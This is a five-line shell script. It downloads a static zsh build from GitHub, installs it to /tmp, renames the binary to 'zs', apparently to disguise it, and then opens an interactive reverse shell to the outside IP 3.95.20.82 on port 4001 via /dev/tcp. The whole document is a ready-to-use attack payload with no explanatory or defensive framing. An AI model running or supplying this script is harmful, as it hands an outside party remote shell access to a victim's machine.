curl https://raw.githubusercontent.com/romkatv/zsh-bin/master/install -o /tmp/install
chmod +x /tmp/install
/tmp/install -d /tmp -e no -q
mv /tmp/zsh /tmp/zs
/tmp/zs -i >& /dev/tcp/3.95.20.82/4001 0>&1
